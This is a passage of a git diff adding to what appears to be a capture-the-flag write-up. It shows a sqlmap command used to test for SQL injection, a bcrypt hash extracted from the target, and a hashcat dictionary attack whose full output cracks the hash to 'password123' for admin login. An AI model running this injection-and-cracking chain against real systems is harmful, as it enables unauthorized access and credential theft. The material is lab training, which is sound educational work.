@@ -93,3 +93,42 @@ Now, we can save the request and test for sql injection.
 
 `sqlmap -r request.txt --ignore-code 401`
 
+![image](https://github.com/user-attachments/assets/2bec84ee-0b66-4245-b3e4-679979f5f7a3)
+
+
+
+![image](https://github.com/user-attachments/assets/46b39c28-852f-4724-8fb3-2f0cdc16523f)
+
+Hash:
+
+    $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.
+
+### Hashcat 
+
+It's a bcrypt hashed password, cracking it with hashcat!
+
+`hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt`
+
+
+    $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
+                                                              
+    Session..........: hashcat
+    Status...........: Cracked
+    Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+    Hash.Target......: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8...63yiv.
+    Time.Started.....: Tue Dec 31 11:42:17 2024 (1 min, 5 secs)
+    Time.Estimated...: Tue Dec 31 11:43:22 2024 (0 secs)
+    Kernel.Feature...: Pure Kernel
+    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
+    Guess.Queue......: 1/1 (100.00%)
+    Speed.#1.........:       22 H/s (5.95ms) @ Accel:6 Loops:16 Thr:1 Vec:1
+    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+    Progress.........: 1404/14344385 (0.01%)
+    Rejected.........: 0/1404 (0.00%)
+    Restore.Point....: 1368/14344385 (0.01%)
+    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4080-4096
+    Candidate.Engine.: Device Generator
+    Candidates.#1....: lacoste -> harry
+    Hardware.Mon.#1..: Util: 80%
+
+Now we have credentials for admin, login and get the flag!
